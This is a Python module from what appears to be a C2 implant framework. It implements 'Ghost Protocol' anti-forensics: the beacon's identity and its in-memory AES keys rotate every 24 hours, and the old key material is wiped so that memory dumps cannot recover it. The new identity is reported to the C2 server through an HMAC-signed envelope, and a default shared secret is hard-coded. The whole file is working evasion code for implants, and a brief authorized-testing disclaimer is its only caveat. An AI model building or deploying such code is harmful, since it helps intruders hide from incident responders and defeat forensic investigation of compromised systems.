"""
Anti-Forensics Key / Beacon-ID Rotation (Ghost Protocol)
========================================================

When a beacon runs against a real target, every byte it leaves behind
(beacon ID, AES-GCM keys, obfuscation material) is potential forensic
evidence. This module automates a 24-hour rotation cycle so that **not a
single byte of the previous identity survives in memory**:

    1. Generate a brand new beacon ID.
    2. Re-derive / replace every in-memory key:
         - transient network crypto key (beacon_id + shared secret)
         - per-task encryption key
         - any extra obfuscation keys (sleepmask, syscall, etc.)
    3. Securely wipe the *old* key material in place (random fill -> zero)
       before dropping the reference, so memory scanners cannot recover it.
    4. Emit a signed re-enrollment envelope so the C2 server can re-link the
       new beacon ID to the same operator session (old ID is never stored).

The rotation is driven by `AntiForensicsRotator.maybe_rotate()`, invoked
from the beacon's check-in loop. It is fully cross-platform and testable:
the only Windows-specific part is the eventual in-kernel key, which is
handled by the agent's own key store.

⚠️ LEGAL WARNING: For authorized penetration testing only.
"""

from __future__ import annotations

import ctypes
import hashlib
import hmac
import secrets
import time
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional


def secure_wipe(buf) -> None:
    """
    Overwrite a mutable byte buffer (bytearray / memoryview) with random
    data and then zeros so the previous contents cannot be recovered from
    a memory dump. No-op for immutable `bytes` (caller should keep keys in
    a bytearray so this is meaningful).
    """
    if not isinstance(buf, (bytearray, memoryview)):
        return
    try:
        size = len(buf)
        if size == 0:
            return
        # Random fill (destroy structure)
        rand = secrets.token_bytes(size)
        buf[:] = rand
        # Zero fill (destroy remaining traces)
        ctypes.memset(ctypes.addressof(ctypes.c_char.from_buffer(buf)), 0, size)
    except Exception:
        # Last resort: python-level zeroing
        try:
            for i in range(len(buf)):
                buf[i] = 0
        except Exception:
            pass


def generate_beacon_id() -> str:
    """Generate a fresh, high-entropy beacon identifier."""
    return secrets.token_hex(16)


@dataclass
class RotationReport:
    """Result of a single anti-forensics rotation"""
    old_beacon_id: str
    new_beacon_id: str
    rotated_keys: int
    timestamp: float
    envelope: Dict[str, str] = field(default_factory=dict)
    notes: List[str] = field(default_factory=list)


# Protocol the rotator expects from each managed crypto object.
#   obj.rotate(*args) -> rotates its key, securely wiping the previous one.
class AntiForensicsRotator:
    """
    Orchestrates periodic rotation of beacon identity and all in-memory keys.

    Args:
        network_crypto:   object with `.rotate(new_beacon_id: str) -> str`
                          (e.g. TransientNetworkCrypto).
        config:           object exposing `beacon_id`,
                          `enable_anti_forensics_rotation`, `rotation_interval`.
        task_crypto:      optional object with `.rotate() -> None`.
        extra_key_rotators: list of zero-arg callables that each wipe + replace
                          one additional key (sleepmask, syscall, etc.).
        shared_secret:    secret shared with the C2 server, used to sign the
                          re-enrollment envelope so the server can verify the
                          identity transition is legitimate.
        on_rotate:        optional callback(RotationReport) invoked after each
                          successful rotation (e.g. to push the envelope to C2).
    """

    def __init__(
        self,
        network_crypto,
        config,
        task_crypto=None,
        extra_key_rotators: Optional[List[Callable[[], None]]] = None,
        shared_secret: str = "MonolithC2TransientSecret2026",
        on_rotate: Optional[Callable[[RotationReport], None]] = None,
    ):
        self.network_crypto = network_crypto
        self.config = config
        self.task_crypto = task_crypto
        self.extra_key_rotators = extra_key_rotators or []
        self.shared_secret = shared_secret
        self.on_rotate = on_rotate
        self._last_rotation: Optional[float] = None

    # ------------------------------------------------------------------
    # Scheduling
    # ------------------------------------------------------------------
    def should_rotate(self, now: float = None) -> bool:
        """True if rotation is enabled and the interval has elapsed."""
        if not getattr(self.config, "enable_anti_forensics_rotation", False):
            return False
        now = now if now is not None else time.time()
        if self._last_rotation is None:
            self._last_rotation = now
            return False
        interval = getattr(self.config, "rotation_interval", 86400)
        return (now - self._last_rotation) >= interval

    def maybe_rotate(self, now: float = None) -> Optional[RotationReport]:
        """
        Rotate if the interval has elapsed, otherwise return None.
        Also performs an initial baseline stamp so the first interval is a
        full `rotation_interval` from beacon start.
        """
        if not self.should_rotate(now):
            return None
        report = self.rotate()
        self._last_rotation = report.timestamp
        return report

    # ------------------------------------------------------------------
    # Core rotation
    # ------------------------------------------------------------------
    def rotate(self, now: float = None) -> RotationReport:
        """Force an immediate full rotation of identity and keys."""
        now = now if now is not None else time.time()

        old_id = getattr(self.config, "beacon_id", "") or ""
        new_id = generate_beacon_id()
        rotated = 0
        notes: List[str] = []

        # 1. Network crypto key (re-derived from the new beacon ID).
        if self.network_crypto is not None and hasattr(self.network_crypto, "rotate"):
            self.network_crypto.rotate(new_id)
            rotated += 1
            notes.append("rotated transient network crypto key")

        # 2. Per-task encryption key.
        if self.task_crypto is not None and hasattr(self.task_crypto, "rotate"):
            self.task_crypto.rotate()
            rotated += 1
            notes.append("rotated task encryption key")

        # 3. Any extra obfuscation keys.
        for fn in self.extra_key_rotators:
            try:
                fn()
                rotated += 1
            except Exception as e:  # pragma: no cover - defensive
                notes.append(f"extra key rotator failed: {e}")

        # 4. Adopt the new identity everywhere.
        self.config.beacon_id = new_id

        # 5. Build a signed re-enrollment envelope for the C2 server.
        envelope = self._build_envelope(old_id, new_id, now)

        report = RotationReport(
            old_beacon_id=old_id,
            new_beacon_id=new_id,
            rotated_keys=rotated,
            timestamp=now,
            envelope=envelope,
            notes=notes,
        )

        if self.on_rotate is not None:
            try:
                self.on_rotate(report)
            except Exception as e:  # pragma: no cover - defensive
                report.notes.append(f"on_rotate callback failed: {e}")

        return report

    # ------------------------------------------------------------------
    # Re-enrollment envelope
    # ------------------------------------------------------------------
    def _build_envelope(self, old_id: str, new_id: str, now: float) -> Dict[str, str]:
        """
        Produce a tamper-evident re-enrollment proof. The C2 server verifies
        the HMAC (keyed with the shared secret) to trust the new beacon ID
        without ever needing the old identity stored on disk.
        """
        ts = str(int(now))
        msg = f"{old_id}|{new_id}|{ts}".encode()
        digest = hmac.new(self.shared_secret.encode(), msg, hashlib.sha256).hexdigest()
        return {
            "type": "anti_forensics_rotation",
            "old_id": old_id,
            "new_id": new_id,
            "timestamp": ts,
            "hmac": digest,
        }

    def verify_envelope(self, envelope: Dict[str, str]) -> bool:
        """Verify a re-enrollment envelope's HMAC (used by the C2 side)."""
        try:
            msg = f"{envelope['old_id']}|{envelope['new_id']}|{envelope['timestamp']}".encode()
            expected = hmac.new(self.shared_secret.encode(), msg, hashlib.sha256).hexdigest()
            return hmac.compare_digest(expected, envelope.get("hmac", ""))
        except Exception:
            return False
